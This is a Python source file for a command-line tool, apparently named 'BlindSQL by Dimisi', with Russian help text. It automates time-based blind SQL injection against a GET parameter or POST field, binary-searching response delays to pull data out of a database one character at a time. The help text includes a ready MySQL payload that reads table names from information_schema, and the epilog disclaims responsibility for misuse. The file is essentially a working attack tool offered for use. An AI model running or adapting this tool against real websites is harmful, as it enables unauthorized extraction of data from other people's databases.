import sys, requests, argparse
from datetime import timedelta



def createParser():
    parser = argparse.ArgumentParser(prog="BlindSQL by Dimisi",
                                     description="Скуля крутится, инфобез мутится."
                                                 "Программа используется либо для get либо для post и никогда для того и другого разом.",
                                     epilog='''(C) DMS, Жора и SavinDaniil 2022. За то, как и кто будет использовать
                                                программу ответсственности не несём. Пистолет это просто пистолет, 
                                                на спусковой крючок жмёт человек.''')

    parser.add_argument('-u', "--url", help="example: https://yandex.ru. Для инъекции в get-запросе не указываем ключ -d"
                                            " и подставляем в url уязвимый параметр со значением FUZZ. Example:"
                                            " https://vk.com/id=FUZZ")

    parser.add_argument("-q", "--query", help='''Используем произвольный time-based SQL-запрос который должен вернуть ИСТИНУ или ЛОЖЬ 
                                                 с обязательной подстановкой в него переменных [INDEX],[ZNAK],[MID] где:
                                                  INDEX - позиция символа в строке, ZNAK - < > = для алгоритма бинарного поиска, 
                                                  MID - средняя позиция в алгоритме бинарного поиска. Скрипт сам будет заменять
                                                  переменные на нужные значения.
                                                  \n Example: 1' AND IF(ascii(substr((SELECT TABLE_NAME FROM 
                                                  information_schema.TABLES WHERE table_schema=database() LIMIT 0,1),
                                                  [INDEX],1))[ZNAK][MID],sleep(2),NULL)-- -
                                                  Значение функции sleep() должно быть не меньше единицы.''')

    parser.add_argument("-d", "--data", default=None, help='''Передаём одной строкой как заголовки, с переменной FUZZ 
                                                           в уязвимом параметре. Example: "name: FUZZ | password: admin | action: submit"''')

    parser.add_argument("-H", "--headers", default=None, help='''Передача заголовков происходит в одну строку 
                                                              с разделителем "|". Example: "Accept: grip, image | User-Agent: Mozila-Firefox, geeko[996]"''')

    return parser


def blind_query(char_index, mid, znak):
    #  a = namespace.query.replace("[INDEX]", str(char_index)).replace("[MID]", str(mid)).replace("[ZNAK]", znak)
    # print(a)
    # print(namespace.data)
    query = namespace.query.replace("[INDEX]", str(char_index)).replace("[MID]", str(mid)).replace("[ZNAK]", znak)

    if namespace.data == None:
        parameter = str(namespace.url).find("FUZZ")
        if parameter != -1:
            resp = requests.get(url=str(namespace.url).replace("FUZZ", query), headers=headers)
        else:
            raise
    else:
        post_data[fuzz_key] = query
        resp = requests.post(url=namespace.url, data=post_data, headers=headers)

    requtime = resp.elapsed
    resp.close()
    if requtime > answer_delay:
        return True
    else:
        return False


def reqursion_find(start, end, char_index):
    if start > end:
        return -1
    mid = (start + end) // 2
    if blind_query(char_index=char_index, mid=mid, znak="="):
        return mid

    if blind_query(char_index=char_index, mid=mid, znak="<"):
        return reqursion_find(start, mid - 1, char_index=char_index)
    else:
        return reqursion_find(mid + 1, end, char_index=char_index)


def strToDict(string=str()):
    result_dict = {}
    while(len(string)>0):
        end_str = 0

        key = string[0: string.find(":")].strip()
        if string.find(":") == -1:
            break
        value = string[string.find(":")+1: string.find("|")].strip()
        if string.find("|") == -1:
            value = string[string.find(":")+1:].strip()
            end_str = 1

        result_dict[key] = value
        string = string.replace(key + ":", "").strip()
        if end_str:
            string.replace(string[0:], "")
            break
        else:
            string = string.replace(value + " | ", "").strip()


    return result_dict



if __name__ == "__main__":
    parser = createParser()
    namespace = parser.parse_args(sys.argv[1:])
    answer_delay = timedelta(seconds=1)


    headers = namespace.headers
    if headers == None:
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                   "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"}
    else:
        headers = strToDict(headers[0])

    post_data = strToDict(str(namespace.data[0]))

    fuzz_key = ""
    for key in post_data:
        if post_data[key] == "FUZZ":
            fuzz_key = key

    final_str = ""
    for i in range(1, 75):
        char = reqursion_find(32, 126, i)
        if char == -1:
            print("work finish")
            print(final_str)
            break
        else:
            final_str += chr(int(char))
        print(chr(int(char)))


